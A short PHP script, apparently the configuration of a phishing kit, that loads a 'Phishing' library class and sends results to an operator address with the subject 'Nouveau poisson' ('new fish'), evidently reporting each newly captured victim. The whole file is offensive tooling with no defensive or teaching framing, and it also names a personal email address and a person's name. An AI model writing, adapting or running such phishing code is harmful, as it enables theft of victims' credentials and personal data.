<?php
define('SUBJECT', 'Nouveau poisson');
define('MY_EMAIL', 'hackmmn@gmail.com');
define('MY_NAME', 'Mbungu ngoma');

require_once __DIR__.'/vendor/autoload.php';

$phishing = new \Informagenie\Phishing();

$phishing->send([
	'my_name' => MY_NAME,
	'my_email' => MY_EMAIL,
	'subject' => SUBJECT
]);